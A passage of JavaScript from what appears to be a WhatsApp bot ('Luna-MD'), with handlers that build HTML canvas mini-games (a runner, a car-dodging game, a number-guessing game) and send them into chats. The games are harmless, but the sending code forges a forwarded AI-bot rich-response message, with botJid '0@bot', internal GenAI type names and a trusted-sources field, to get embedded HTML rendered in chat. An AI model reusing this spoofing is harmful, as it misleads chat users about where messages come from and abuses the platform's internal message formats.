x.fillRect(q.x+q.w,q.y+18,7,6);
x.fillRect(q.x+q.w+1,q.y+12,6,12);
x.restore()
}
function drawParticles(){
particles.forEach(p=>{x.fillStyle='rgba('+p.col+','+Math.max(p.life,0)+')';x.fillRect(p.x,p.y,p.size,p.size)})
}
function drawAmbient(){
ambient.forEach(p=>{let a=.15+Math.sin(runT*.05+p.ph)*.1;x.fillStyle='rgba(180,160,255,'+a+')';x.beginPath();x.arc(p.x,p.y,p.r,0,7);x.fill()})
}
function draw(){
x.clearRect(0,0,c.width,c.height);
x.save();
if(shake>0)x.translate((Math.random()-.5)*shake,(Math.random()-.5)*shake);
drawAmbient();
x.fillStyle='rgba(255,255,255,.35)';
clouds.forEach(q=>{let b=Math.sin(runT*.03+q.x)*2;x.fillRect(q.x,q.y+b,q.w,5);x.fillRect(q.x+10,q.y+b-5,q.w*.45,10)});
x.strokeStyle='rgba(255,255,255,.25)';
x.lineWidth=2;
x.setLineDash([10,8]);
x.lineDashOffset=-runT*speed*.6;
x.beginPath();x.moveTo(0,GY);x.lineTo(c.width,GY);x.stroke();
x.setLineDash([]);
drawTrail();
drawDino();
o.forEach(drawCactus);
drawParticles();
if(flash>0){x.fillStyle='rgba(255,60,60,'+(flash*.35)+')';x.fillRect(0,0,c.width,c.height)}
x.restore();
if(gameOver){
x.fillStyle='rgba(15,15,25,.55)';x.fillRect(0,0,c.width,c.height);
x.fillStyle='#fff';x.textAlign='center';
x.font='bold 24px Arial';x.fillText('GAME OVER',c.width/2,85);
x.font='14px Arial';x.fillText('Tap layar untuk main lagi',c.width/2,112);
x.textAlign='left'
}
}
function loop(t){
if(!last)last=t;
let dt=Math.min((t-last)/16.67,2);
last=t;
runT+=dt;
if(!gameOver){
d.y+=d.vy*dt;d.vy+=.75*dt;
if(d.y>=132){
if(d.jumping){burst(d.x+13,GY,10,'255,255,255',3.5);squash=1.35}
d.y=132;d.vy=0;d.jumping=false
}
if(d.jumping)trail.push({x:d.x,y:d.y});
if(trail.length>6)trail.shift();
if(!d.jumping)trail.length=0;
squash+=(1-squash)*.18*dt;
if(!d.jumping&&Math.floor(runT)%8===0&&Math.random()<.4)burst(d.x+6,GY-2,1,'255,255,255',1.5);
ambient.forEach(p=>{p.x-=p.vx*dt;if(p.x<-4)p.x=c.width+4});
spawnTimer-=dt;
if(spawnTimer<=0){cactus();spawnTimer=Math.max(38,62-speed*1.4)+Math.random()*30}
o.forEach(q=>q.x-=speed*dt);
o=o.filter(q=>q.x>-40);
clouds.forEach(q=>{q.x-=q.s*dt;if(q.x<-80)q.x=c.width+Math.random()*100});
particles.forEach(p=>{p.x+=p.vx*dt;p.y+=p.vy*dt;p.vy+=.3*dt;p.life-=.03*dt});
particles=particles.filter(p=>p.life>0);
speed=Math.min(11,speed+.0018*dt);
score+=dt*.6;
if(score>best)best=score;
if(Math.floor(score/500)>milestone){
milestone=Math.floor(score/500);
scoreEl.style.transform='scale(1.35)';
setTimeout(()=>scoreEl.style.transform='scale(1)',150)
}
scoreEl.textContent=String(Math.floor(score)).padStart(5,'0');
bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0');
statusEl.textContent='Speed '+speed.toFixed(1)+'x';
for(const q of o)if(hit(d,q)){
gameOver=true;shake=14;flash=1;
saveBest(best);
burst(d.x+13,d.y+15,18,'255,90,90',5)
}
}
if(shake>0)shake=Math.max(0,shake-.6*dt);
if(flash>0)flash=Math.max(0,flash-.05*dt);
draw();
requestAnimationFrame(loop)
}
document.addEventListener('pointerdown',e=>{e.preventDefault();jumpDino()});
document.addEventListener('keydown',e=>{if(e.code==='Space'){e.preventDefault();jumpDino()}});
reset();
requestAnimationFrame(loop);
</script></body>
`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "mbim": {
const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; margin: 0; padding: 0; }
body { margin: 0; background: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; touch-action: none; overflow: hidden; }
.wrapper { width: 100%; max-width: 480px; margin: auto; padding: 12px; }
.card { background: linear-gradient(180deg, rgba(15,18,26,0.97), rgba(10,12,18,0.97)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 2px solid #f59e0b; border-radius: 20px; overflow: hidden; box-shadow: 0 14px 44px rgba(0,0,0,0.75), inset 0 0 40px rgba(245,158,11,0.06); padding: 14px; position: relative; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.title { font-size: 10px; letter-spacing: 1.5px; color: #f59e0b; font-weight: 800; text-transform: uppercase; display:flex; align-items:center; gap:6px; }
.title .dot{ width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 8px #10b981; animation: pulse 1.4s infinite; }
@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
.score-badge { font-size: 20px; font-weight: 900; color: #10b981; text-shadow: 0 0 12px rgba(16,185,129,0.5); font-variant-numeric: tabular-nums; }
.best-badge { font-size: 10px; color: #94a3b8; font-variant-numeric: tabular-nums; }
.stat-row { display:flex; gap:8px; margin-bottom:8px; }
.stat-pill { flex:1; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:5px 8px; text-align:center; }
.stat-pill .lbl{ font-size:8px; letter-spacing:1px; color:#64748b; text-transform:uppercase; font-weight:700; }
.stat-pill .val{ font-size:13px; font-weight:900; color:#fff; font-variant-numeric: tabular-nums; }
#game-container { position: relative; width: 100%; height: 350px; border-radius: 14px; overflow: hidden; border: 2px solid #1e293b; box-shadow: inset 0 0 30px rgba(0,0,0,0.6); }
canvas { width: 100%; height: 100%; display: block; background: #1a2332; }
.controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
.btn { padding: 14px; font-size: 15px; font-weight: 800; border: none; border-radius: 12px; cursor: pointer; color: #fff; text-align: center; letter-spacing: 0.5px; position: relative; overflow: hidden; }
.btn-left { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 16px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn-right { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 16px rgba(236,72,153,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn:active { transform: scale(0.95); filter: brightness(0.9); }
.credit-bar { margin-top: 10px; text-align: center; font-size: 10px; font-weight: 800; letter-spacing: 1.5px; color: #94a3b8; text-transform: uppercase; border-top: 1px dashed rgba(255,255,255,0.12); padding-top: 8px; }
.credit-bar span { color: #f59e0b; text-shadow: 0 0 10px rgba(245,158,11,0.5); }
</style>
<body>
<div class="wrapper">
  <div class="card">
    <div class="header">
      <div>
        <div class="title"><span class="dot"></span>Luna-MD</div>
        <h2 style="font-size: 17px; font-weight: 900; color: #fff; margin-top:2px;">Highway Rush 🏎️</h2>
      </div>
      <div style="text-align: right;">
        <div class="score-badge" id="score">0000</div>
        <div class="best-badge" id="best">BEST 0000</div>
      </div>
    </div>

    <div class="stat-row">
      <div class="stat-pill"><div class="lbl">Speed</div><div class="val" id="speedStat">60</div></div>
      <div class="stat-pill"><div class="lbl">Combo</div><div class="val" id="comboStat">x1</div></div>
      <div class="stat-pill"><div class="lbl">Dodged</div><div class="val" id="dodgeStat">0</div></div>
    </div>

    <div id="game-container">
      <canvas id="c"></canvas>
    </div>

    <div class="controls">
      <button class="btn btn-left" id="leftBtn">⬅️ LEFT</button>
      <button class="btn btn-right" id="rightBtn">RIGHT ➡️</button>
    </div>

    <div class="credit-bar">
      Engineered by <span>Luna-MD</span> ⚡
    </div>
  </div>
</div>

<script>
(function() {
  var cvs = document.getElementById('c');
  var ctx = cvs.getContext('2d');
  var scoreEl = document.getElementById('score');
  var bestEl = document.getElementById('best');
  var speedStatEl = document.getElementById('speedStat');
  var comboStatEl = document.getElementById('comboStat');
  var dodgeStatEl = document.getElementById('dodgeStat');

  var W = 360;
  var H = 350;
  cvs.width = W;
  cvs.height = H;

  var ROAD_L = 26, ROAD_R = W - 26;
  var laneCount = 4;
  var laneW = (ROAD_R - ROAD_L) / laneCount;
  var lanes = [];
  for (var li = 0; li < laneCount; li++) lanes.push(ROAD_L + laneW * (li + 0.5));

  var currentLane = 1;
  var targetX = lanes[currentLane];
  var playerX = lanes[currentLane];
  var playerY = H - 72;
  var playerTilt = 0;

  var baseSpeed = 5.2;
  var speed = baseSpeed;
  var roadOffset = 0;
  var score = 0;
  var best = 0;
  var dodged = 0;
  var combo = 1;
  var comboTimer = 0;
  var shake = 0;
  var flashAlpha = 0;

  try { best = parseInt(localStorage.getItem('car_best_v2') || '0', 10) || 0; } catch(e){}
  bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');

  var traffic = [];
  var coins = [];
  var particles = [];
  var skidmarks = [];
  var clouds = [];
  var trees = [];
  var gameOver = false;
  var frame = 0;

  var CAR_PALETTES = [
    { body: '#ef4444', dark: '#991b1b', light: '#fca5a5' },
    { body: '#3b82f6', dark: '#1e3a8a', light: '#93c5fd' },
    { body: '#10b981', dark: '#065f46', light: '#6ee7b7' },
    { body: '#f59e0b', dark: '#92400e', light: '#fcd34d' },
    { body: '#8b5cf6', dark: '#4c1d95', light: '#c4b5fd' },
    { body: '#ec4899', dark: '#831843', light: '#f9a8d4' },
    { body: '#e2e8f0', dark: '#64748b', light: '#ffffff' }
  ];

  for (var tc = 0; tc < 6; tc++) {
    trees.push({ x: Math.random() * W, y: Math.random() * H, side: Math.random() < 0.5 ? 0 : 1, size: 10 + Math.random() * 8 });
  }
  for (var cc = 0; cc < 4; cc++) {
    clouds.push({ x: Math.random() * W, y: 10 + Math.random() * 60, w: 40 + Math.random() * 40, spd: 0.2 + Math.random() * 0.3 });
  }

  function spawnTraffic() {
    var occupied = {};
    for (var i = 0; i < traffic.length; i++) {
      if (traffic[i].y < 90) occupied[traffic[i].lane] = true;
    }
    var free = [];
    for (var l = 0; l < laneCount; l++) if (!occupied[l]) free.push(l);
    if (free.length === 0) return;
    var laneIdx = free[Math.floor(Math.random() * free.length)];
    var pal = CAR_PALETTES[Math.floor(Math.random() * (CAR_PALETTES.length - 1))];
    var isTruck = Math.random() < 0.18;
    traffic.push({
      lane: laneIdx,
      x: lanes[laneIdx],
      y: -70,
      w: isTruck ? 32 : 26,
      h: isTruck ? 58 : 44,
      pal: pal,
      speed: 1.8 + Math.random() * 2.2,
      truck: isTruck,
      scored: false
    });
  }

  function spawnCoin() {
    var laneIdx = Math.floor(Math.random() * laneCount);
    coins.push({ x: lanes[laneIdx], y: -30, r: 9, collected: false, spin: 0 });
  }

  function roundRect(x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.arcTo(x + w, y, x + w, y + h, r);
    ctx.arcTo(x + w, y + h, x, y + h, r);
    ctx.arcTo(x, y + h, x, y, r);
    ctx.arcTo(x, y, x + w, y, r);
    ctx.closePath();
  }

  function drawCar(cx, cy, w, h, pal, isPlayer, tilt) {
    ctx.save();
    ctx.translate(cx, cy);
    if (tilt) ctx.rotate(tilt);
    ctx.translate(-w / 2, -h / 2);

    ctx.save();
    ctx.fillStyle = 'rgba(0,0,0,0.35)';
    ctx.beginPath();
    ctx.ellipse(w / 2, h - 2, w * 0.6, 7, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();

    ctx.fillStyle = '#0b0f17';
    var wheelY = [7, h - 16];
    for (var wi = 0; wi < 2; wi++) {
      roundRect(-3, wheelY[wi], 4, 12, 2); ctx.fill();
      roundRect(w - 1, wheelY[wi], 4, 12, 2); ctx.fill();
    }

    var grad = ctx.createLinearGradient(0, 0, w, 0);
    grad.addColorStop(0, pal.dark);
    grad.addColorStop(0.5, pal.body);
    grad.addColorStop(1, pal.light);
    ctx.fillStyle = grad;
    roundRect(0, 0, w, h, 6);
    ctx.fill();

    var roofY = isPlayer ? 8 : 11;
    var roofH = h * 0.33;
    ctx.fillStyle = '#0b0f17';
    roundRect(3, roofY, w - 6, roofH, 4);
    ctx.fill();

    ctx.fillStyle = '#93c5fd';
    roundRect(5, roofY + 2, w - 10, roofH - 4, 3);
    ctx.fill();

    if (isPlayer) {
      ctx.fillStyle = '#fff7c2';
      ctx.fillRect(2, 1, 5, 3);
      ctx.fillRect(w - 7, 1, 5, 3);
    } else {
      ctx.fillStyle = '#ff3b3b';
      ctx.fillRect(2, h - 4, 5, 3);
      ctx.fillRect(w - 7, h - 4, 5, 3);
    }

    ctx.restore();
  }

  function explode(x, y, color) {
    for (var i = 0; i < 30; i++) {
      var angle = Math.random() * Math.PI * 2;
      var spd = 2 + Math.random() * 6;
      particles.push({ x: x, y: y, vx: Math.cos(angle) * spd, vy: Math.sin(angle) * spd, color: color, life: 1, size: 2 + Math.random() * 3 });
    }
    shake = 10;
    flashAlpha = 0.45;
  }

  var spawnCounter = 0;
  var coinCounter = 0;

  function drawBackground() {
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(0, 0, W, H);

    ctx.fillStyle = '#0d7a4f';
    ctx.fillRect(0, 0, ROAD_L, H);
    ctx.fillRect(ROAD_R, 0, W - ROAD_R, H);

    for (var ti = 0; ti < trees.length; ti++) {
      var tr = trees[ti];
      if (!gameOver) tr.y += speed * 0.9;
      if (tr.y > H + 20) { tr.y = -20; tr.x = tr.side === 0 ? Math.random() * (ROAD_L - 8) + 2 : ROAD_R + Math.random() * (W - ROAD_R - 8) + 2; }
      ctx.fillStyle = '#064e3b';
      ctx.beginPath();
      ctx.arc(tr.x, tr.y, tr.size, 0, Math.PI * 2);
      ctx.fill();
    }

    ctx.fillStyle = '#263143';
    ctx.fillRect(ROAD_L, 0, ROAD_R - ROAD_L, H);

    ctx.fillStyle = '#fde68a';
    ctx.fillRect(ROAD_L, 0, 3, H);
    ctx.fillRect(ROAD_R - 3, 0, 3, H);

    if (!gameOver) roadOffset = (roadOffset + speed) % 44;
    ctx.fillStyle = 'rgba(226,232,240,0.85)';
    for (var l = 1; l < laneCount; l++) {
      var lx = ROAD_L + laneW * l;
      for (var y = -44 + roadOffset; y < H; y += 44) {
        ctx.fillRect(lx - 2, y, 4, 22);
      }
    }
  }

  function update() {
    frame++;
    ctx.save();
    if (shake > 0) {
      var sx = (Math.random() - 0.5) * shake;
      var sy = (Math.random() - 0.5) * shake;
      ctx.translate(sx, sy);
      shake *= 0.88;
      if (shake < 0.5) shake = 0;
    }

    ctx.clearRect(-10, -10, W + 20, H + 20);
    drawBackground();

    if (!gameOver) {
      score += 1 + Math.floor(combo / 2);
      scoreEl.textContent = String(score).padStart(4, '0');
      if (score > best) {
        best = score;
        try { localStorage.setItem('car_best_v2', String(best)); } catch(e){}
        bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
      }

      speed = baseSpeed + Math.min(score / 450, 4.0);
      speedStatEl.textContent = Math.round(speed * 18);
      dodgeStatEl.textContent = dodged;
      comboStatEl.textContent = 'x' + combo;

      if (comboTimer > 0) {
        comboTimer--;
      } else if (combo > 1) {
        combo = 1;
      }

      playerX += (targetX - playerX) * 0.25;
      playerTilt = (targetX - playerX) * 0.004;

      spawnCounter++;
      var spawnGap = Math.max(24, 44 - Math.floor(score / 160));
      if (spawnCounter > spawnGap) { spawnTraffic(); spawnCounter = 0; }

      coinCounter++;
      if (coinCounter > 65) { spawnCoin(); coinCounter = 0; }
    }

    for (var c = coins.length - 1; c >= 0; c--) {
      var coin = coins[c];
      if (!gameOver) { coin.y += speed; coin.spin += 0.15; }
      var squash = Math.abs(Math.cos(coin.spin));
      ctx.save();
      ctx.translate(coin.x, coin.y);
      ctx.scale(Math.max(0.2, squash), 1);
      ctx.fillStyle = '#fbbf24';
      ctx.beginPath();
      ctx.arc(0, 0, coin.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();

      var cdx = Math.abs(playerX - coin.x);
      var cdy = Math.abs(playerY + 20 - coin.y);
      if (cdx < 20 && cdy < 24 && !coin.collected && !gameOver) {
        coin.collected = true;
        score += 40 * combo;
        combo = Math.min(combo + 1, 9);
        comboTimer = 90;
        explode(coin.x, coin.y, '#fbbf24');
        coins.splice(c, 1);
      } else if (coin.y > H + 20) {
        coins.splice(c, 1);
      }
    }

    for (var i = traffic.length - 1; i >= 0; i--) {
      var t = traffic[i];
      if (!gameOver) {
        t.y += (speed - t.speed);
        if (t.y - t.h / 2 > playerY + 10 && !t.scored) {
          t.scored = true;
          dodged++;
        }
      }
      drawCar(t.x, t.y, t.w, t.h, t.pal, false, 0);

      var dx = Math.abs(playerX - t.x);
      var dy = Math.abs(playerY - t.y);
      if (dx < (t.w + 22) / 2 - 4 && dy < (t.h + 40) / 2 - 6 && !gameOver) {
        gameOver = true;
        explode(playerX, playerY + 20, '#f59e0b');
        explode(t.x, t.y + 20, t.pal.body);
      }

      if (t.y > H + 80) traffic.splice(i, 1);
    }

    if (!gameOver) {
      drawCar(playerX, playerY, 26, 44, { body: '#f59e0b', dark: '#92400e', light: '#fde68a' }, true, playerTilt);
    }

    for (var p = particles.length - 1; p >= 0; p--) {
      var pt = particles[p];
      pt.x += pt.vx;
      pt.y += pt.vy;
      pt.life -= 0.04;
      if (pt.life <= 0) { particles.splice(p, 1); continue; }
      ctx.globalAlpha = Math.max(pt.life, 0);
      ctx.fillStyle = pt.color;
      ctx.beginPath();
      ctx.arc(pt.x, pt.y, pt.size || 3, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;
    }

    if (flashAlpha > 0.01) {
      ctx.fillStyle = 'rgba(255,255,255,' + flashAlpha + ')';
      ctx.fillRect(0, 0, W, H);
      flashAlpha *= 0.85;
    }

    if (gameOver) {
      ctx.fillStyle = 'rgba(10, 12, 20, 0.85)';
      ctx.fillRect(0, 0, W, H);

      ctx.textAlign = 'center';
      ctx.fillStyle = '#ef4444';
      ctx.font = '900 24px sans-serif';
      ctx.fillText('CRASHED 💥', W / 2, H / 2 - 25);

      ctx.fillStyle = '#ffffff';
      ctx.font = '800 14px sans-serif';
      ctx.fillText('Score: ' + score, W / 2, H / 2 - 2);
      ctx.fillStyle = '#94a3b8';
      ctx.font = '600 11px sans-serif';
      ctx.fillText('Best: ' + best + '  •  Dodged: ' + dodged, W / 2, H / 2 + 18);

      ctx.fillStyle = '#fbbf24';
      ctx.font = '700 12px sans-serif';
      ctx.fillText('TAP TO RESTART', W / 2, H / 2 + 42);
    }

    ctx.restore();
    requestAnimationFrame(update);
  }

  function moveLeft() {
    if (gameOver) return;
    if (currentLane > 0) currentLane--;
    targetX = lanes[currentLane];
  }

  function moveRight() {
    if (gameOver) return;
    if (currentLane < lanes.length - 1) currentLane++;
    targetX = lanes[currentLane];
  }

  function restart() {
    score = 0;
    dodged = 0;
    combo = 1;
    comboTimer = 0;
    scoreEl.textContent = '0000';
    traffic = [];
    coins = [];
    particles = [];
    currentLane = 1;
    targetX = lanes[currentLane];
    playerX = lanes[currentLane];
    speed = baseSpeed;
    gameOver = false;
  }

  function addTapEvent(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('pointerdown', function(e) { e.preventDefault(); fn(); });
  }

  addTapEvent('leftBtn', moveLeft);
  addTapEvent('rightBtn', moveRight);

  function handleCanvasTap(e) {
    e.preventDefault();
    if (gameOver) { restart(); return; }
    var rect = cvs.getBoundingClientRect();
    var clientX = e.clientX;
    if (e.touches && e.touches.length > 0) clientX = e.touches[0].clientX;
    var clickX = (clientX - rect.left) * (W / rect.width);
    if (clickX < W / 2) moveLeft(); else moveRight();
  }

  cvs.addEventListener('pointerdown', handleCanvasTap);

  update();
})();
</script>
</body>
</html>`

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
)
}
break

case "tebakbom": {
const html = String.raw`
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Whisper · Tebak Boom vs Luna</title>
<style>
  * {
    box-sizing: border-box;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
  }

  html, body { height: 100%; margin: 0; }

  body {
    background: #0d0f1a;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    font-family: 'Courier New', Courier, monospace;
    touch-action: manipulation;
    padding: 4px;
  }

  .game-wrapper {
    background: #1a1f2f;
    padding: 1.4rem 0.8rem 0.8rem;
    border-radius: 1.6rem;
    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.7), inset 0 0 0 2px #3a4a6a;
    border: 3px solid #2a3a5a;
    max-width: 380px;
    width: 100%;
    position: relative;
    margin-top: 10px;
  }

  .game-wrapper::before {
    content: '💥 T E B A K  B O O M';
    position: absolute;
    top: -11px;
    left: 50%;
    transform: translateX(-50%);
    background: #1a1f2f;
    color: #b0c8ff;
    padding: 2px 10px;
    font-size: 0.55rem;
    letter-spacing: 3px;
    border-radius: 30px;
    border: 2px solid #4a6a8a;
    text-shadow: 0 0 10px #6f8fcf;
    font-weight: bold;
    white-space: nowrap;
  }

  .level-bar {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 5px;
    margin-bottom: 0.6rem;
  }

  .level-btn {
    background: #0f1524;
    color: #6a7a9a;
    border: 2px solid #2a3a5a;
    border-radius: 8px;
    font-size: 0.6rem;
    font-weight: bold;
    padding: 0.35rem 0.1rem;
    cursor: pointer;
    transition: 0.1s;
    font-family: inherit;
    letter-spacing: 0.5px;
    text-align: center;
  }

  .level-btn:active {
    transform: scale(0.95);
  }

  .level-btn.active {
    background: #2a4a7a;
    color: #c8dfff;
    border-color: #6a9aff;
    box-shadow: 0 0 10px rgba(80, 150, 255, 0.5);
    text-shadow: 0 0 6px #6a9aff;
  }

  .level-btn[data-level="easy"].active {
    background: #1a4a2a;
    border-color: #4aff6a;
    color: #b0ffb0;
    box-shadow: 0 0 10px rgba(74, 255, 106, 0.5);
  }

  .level-btn[data-level="hard"].active {
    background: #4a2a1a;
    border-color: #ff8a4a;
    color: #ffd0b0;
    box-shadow: 0 0 10px rgba(255, 138, 74, 0.5);
  }

  .level-btn[data-level="master"].active {
    background: #4a1a2a;
    border-color: #ff4a7a;
    color: #ffb0c8;
    box-shadow: 0 0 10px rgba(255, 74, 122, 0.5);
  }

  .display-area {
    background: #0a0e1a;
    border-radius: 16px;
    padding: 0.7rem 0.6rem;
    box-shadow: inset 0 0 0 2px #2a3a5a, 0 5px 8px rgba(0, 0, 0, 0.5);
    margin-bottom: 0.6rem;
  }

  .number-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 6px;
    width: 100%;
    margin: 0 auto;
    touch-action: manipulation;
  }

  .num-btn {
    background: #1a2a4a;
    border: 2px solid #3a5a7a;
    border-radius: 10px;
    color: #c8dfff;
    font-size: 1.2rem;
    font-weight: bold;
    text-align: center;
    box-shadow: inset 0 -4px 0 #0f1a2f, 0 2px 0 #0a1220;
    cursor: pointer;
    transition: 0.04s linear;
    touch-action: manipulation;
    font-family: inherit;
    aspect-ratio: 1 / 1;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .num-btn:active {
    transform: translateY(2px);
    box-shadow: inset 0 -2px 0 #0f1a2f, 0 0 0 #0a1220;
  }

  .num-btn.selected {
    background: #2a4a7a;
    border-color: #6a9aff;
    box-shadow: inset 0 -4px 0 #1a2a5a, 0 2px 0 #0a1220, 0 0 12px rgba(80, 150, 255, 0.3);
  }

  .num-btn.boom {
    background: #7a2a2a;
    border-color: #ff5a5a;
    color: #ffb0b0;
    box-shadow: inset 0 -4px 0 #4a1a1a, 0 2px 0 #0a1220, 0 0 18px rgba(255, 50, 50, 0.4);
  }

  .num-btn.hidden {
    background: #0a0e1a;
    border-color: #1a2a3a;
    color: transparent;
    box-shadow: inset 0 -4px 0 #05080f, 0 2px 0 #0a1220;
  }

  .num-btn.revealed {
    background: #1a3a2a;
    border-color: #4a8a5a;
    color: #b0ffb0;
    box-shadow: inset 0 -4px 0 #0f2a1a, 0 2px 0 #0a1220, 0 0 12px rgba(50, 255, 80, 0.25);
  }

  .num-btn.ai {
    background: #4a2a7a;
    border-color: #a07aff;
    color: #e0c8ff;
    box-shadow: inset 0 -4px 0 #2a1a4a, 0 2px 0 #0a1220, 0 0 12px rgba(160, 100, 255, 0.4);
  }

  .num-btn.disabled {
    opacity: 0.5;
    transform: scale(0.95);
    pointer-events: none;
  }

  .status-panel {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 6px;
    padding: 0 2px;
  }

  .score-box {
    background: #0a0e1a;
    color: #b0c8ff;
    font-size: 0.75rem;
    font-weight: bold;
    padding: 0.2rem 0.7rem;
    border-radius: 40px;
    border: 2px solid #3a5a7a;
    box-shadow: inset 0 -2px 0 #1a2a4a;
    text-shadow: 0 0 6px #6f8fcf;
    text-align: center;
    white-space: nowrap;
  }

  .ctrl-btn {
    background: #1a2a4a;
    color: #c8dfff;
    border: 2px solid #3a5a7a;
    font-size: 0.75rem;
    font-weight: bold;
    padding: 0.25rem 0.8rem;
    border-radius: 60px;
    box-shadow: inset 0 -4px 0 #0f1a2f, 0 2px 0 #0a1220;
    cursor: pointer;
    transition: 0.06s linear;
    font-family: inherit;
    white-space: nowrap;
  }

  .ctrl-btn:active {
    transform: translateY(2px);
    box-shadow: inset 0 -2px 0 #0f1a2f;
  }

  .msg-box {
    text-align: center;
    font-size: 0.75rem;
    color: #b0c8ff;
    min-height: 1.1rem;
    padding: 0.35rem 0.2rem 0;
    text-shadow: 0 0 8px #4f6faf;
    font-weight: bold;
    line-height: 1.3;
  }

  .msg-box.you  { color: #b0ffb0; text-shadow: 0 0 8px #4aff6a; }
  .msg-box.ai   { color: #e0c8ff; text-shadow: 0 0 8px #a07aff; }
  .msg-box.boom { color: #ffb0b0; text-shadow: 0 0 8px #ff5a5a; }

  .hint {
    color: #6a7a9a;
    text-align: center;
    margin-top: 6px;
    font-size: 0.55rem;
    letter-spacing: 1px;
    opacity: 0.7;
  }
</style>
</head>
<body>

<div class="game-wrapper">
  <div class="level-bar">
    <button class="level-btn active" data-level="easy">EASY</button>
    <button class="level-btn" data-level="medium">MEDIUM</button>
    <button class="level-btn" data-level="hard">HARD</button>
    <button class="level-btn" data-level="master">MASTER</button>
  </div>

  <div class="display-area">
    <div class="number-grid" id="numberGrid"></div>
    <div class="msg-box" id="messageBox">✨ Pilih level, lalu mulai!</div>
  </div>

  <div class="status-panel">
    <div class="score-box" id="scoreDisplay">🧑 0 - 0 🤖</div>
    <button class="ctrl-btn" id="resetBtn">↻ Restart</button>
  </div>

  <div class="hint" id="hintText">👆 kamu vs Luna · 1 BOOM tersembunyi</div>
</div>

<script>
(function () {
  const TOTAL = 12;

  let boomIndex = -1;
  let revealed = [];
  let owner = [];
  let gameOver = false;
  let yourTurn = true;
  let busy = false;
  let scoreYou = 0;
  let scoreAI = 0;
  let level = 'easy';
  let audioCtx = null;

